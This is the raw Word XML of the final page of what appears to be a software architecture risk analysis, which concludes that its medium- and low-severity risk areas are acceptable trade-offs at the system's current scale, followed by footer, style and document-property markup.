    <w:p w14:paraId="68929568" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The medium-severity risks (Areas 3, 4, and 5) are architectural constraints that are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>acceptable for the current scale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but would become limiting factors as the user base grows. They represent natural evolution points for the system's architecture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7A9783" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>The low-severity risks (Area 6) are largely mitigated by framework defaults and represent standard hardening measures that improve robustness without fundamentally changing the architecture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C13698A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Critically, this analysis demonstrates that the development team is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>aware of these trade-offs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and has made </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>deliberate architectural decisions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> appropriate for the system's current scope, while understanding what would need to change for production-scale deployment.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00CB2F5B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BB664" w14:textId="77777777" w:rsidR="00273C96" w:rsidRDefault="00273C96">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3CA168D8" w14:textId="77777777" w:rsidR="00273C96" w:rsidRDefault="00273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E5655" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:color w:val="808080"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r w:rsidR="000C00CB">
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="000C00CB">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>1</w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:color w:val="808080"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t xml:space="preserve"> of </w:t>
    </w:r>
    <w:fldSimple w:instr=" NUMPAGES ">
      <w:r w:rsidR="000C00CB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3F728" w14:textId="77777777" w:rsidR="00273C96" w:rsidRDefault="00273C96">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="4338C6F9" w14:textId="77777777" w:rsidR="00273C96" w:rsidRDefault="00273C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78297">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="128401279">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1982733634">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="2052881627">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1806776901">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1353452931">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="2006278071">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="468858613">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="36263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0CB"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00273C96"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003B4846"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BC3874"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CB2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BAAF26"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{9D4A5BD6-1174-4FC9-9B6A-D3EABBCE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3E50"/>
      <w:sz w:val="40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32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  <w:sz w:val="26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C3E50"/>
      <w:sz w:val="23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C00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C00CB"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="440"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="FontParagrafDefault"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000C00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4265</Words>
  <Characters>24313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ATHALLAH PANDHU NITISARA</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-11T18:16:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>